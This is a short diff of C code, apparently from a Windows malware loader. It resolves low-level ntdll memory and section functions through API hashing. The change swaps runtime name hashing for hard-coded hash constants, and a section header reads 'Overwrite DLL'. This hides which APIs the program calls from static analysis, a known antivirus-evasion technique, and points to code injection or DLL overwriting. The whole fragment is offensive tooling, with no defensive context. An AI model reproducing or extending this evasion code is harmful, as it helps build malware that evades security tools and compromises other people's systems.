@@ -20,15 +20,12 @@
 
 void* ntdllmod = GetModuleHandleA("ntdll.dll");
 
-fnLdrCallEnclave MyCallFunc = (fnLdrCallEnclave)findfunc(ntdllmod, hashstr("LdrCallEnclave"));
-fnNtProtectVirtualMemory MyProtectVirtualMem = (fnNtProtectVirtualMemory)findfunc(ntdllmod, hashstr("NtProtectVirtualMemory"));
-fnNtAllocateVirtualMemory MyAllocMem = (fnNtAllocateVirtualMemory)findfunc(ntdllmod, hashstr("NtAllocateVirtualMemory"));
-fnNtUnmapViewOfSection MyUnmapSec = (fnNtUnmapViewOfSection)findfunc(ntdllmod, hashstr("NtUnmapViewOfSection"));
-fnNtCreateSection MyCreateSection = (fnNtCreateSection)findfunc(ntdllmod, hashstr("NtCreateSection"));
-fnNtMapViewOfSection MyMapViewOfSection = (fnNtMapViewOfSection)findfunc(ntdllmod, hashstr("NtMapViewOfSection"));
-
-HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-fnLoadLibraryExW MyLoadLibrary = (fnLoadLibraryExW)findfunc(hKernel32, hashstr("LoadLibraryExW"));
+fnLdrCallEnclave MyCallFunc = (fnLdrCallEnclave)findfunc(ntdllmod, 0x7D2832BF);
+fnNtProtectVirtualMemory MyProtectVirtualMem = (fnNtProtectVirtualMemory)findfunc(ntdllmod, 0x696C691D);
+fnNtAllocateVirtualMemory MyAllocMem = (fnNtAllocateVirtualMemory)findfunc(ntdllmod, 0x05F5C272);
+fnNtUnmapViewOfSection MyUnmapSec = (fnNtUnmapViewOfSection)findfunc(ntdllmod, 0x645F70FA);
+fnNtCreateSection MyCreateSection = (fnNtCreateSection)findfunc(ntdllmod, 0xA69EB161);
+fnNtMapViewOfSection MyMapViewOfSection = (fnNtMapViewOfSection)findfunc(ntdllmod, 0x27F26EF7);
 
 
 /*========================================================[Overwrite DLL]=================================================================================*/
